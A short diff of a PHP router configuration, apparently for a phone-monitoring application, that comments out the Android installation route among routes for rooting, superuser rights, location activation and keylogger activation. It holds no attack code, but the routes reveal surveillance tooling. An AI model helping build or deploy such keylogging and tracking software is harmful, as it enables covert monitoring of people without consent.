@@ -163,7 +163,7 @@ $di->setShared('router', function() use($config, $di) {
     // instructions
     $router->add('rooting-android', new \System\Router\Regex('/instructions/rooting-android', array('controller' => 'Index', 'action' => 'rootingAndroid')));
     $router->add('granting-superuser-rights', new \System\Router\Regex('/instructions/granting-superuser-rights', array('controller' => 'Index', 'action' => 'superuser')));
-    $router->add('installing-android', new \System\Router\Regex('/instructions/installing-android', array('controller' => 'Index', 'action' => 'installingAndroid', 'public' => true)));
+ // @TODO delete this line//    $router->add('installing-android', new \System\Router\Regex('/instructions/installing-android', array('controller' => 'Index', 'action' => 'installingAndroid', 'public' => true)));
     $router->add('installing-ios', new \System\Router\Regex('/instructions/installing-ios', array('controller' => 'Index', 'action' => 'installingIos', 'public' => true)));
     $router->add('activate-location', new \System\Router\Regex('/instructions/activate-location', array('controller' => 'Instructions', 'action' => 'activateLocation')));
     $router->add('activate-keylogger', new \System\Router\Regex('/instructions/activate-keylogger', array('controller' => 'Instructions', 'action' => 'keyloggerActivation')));
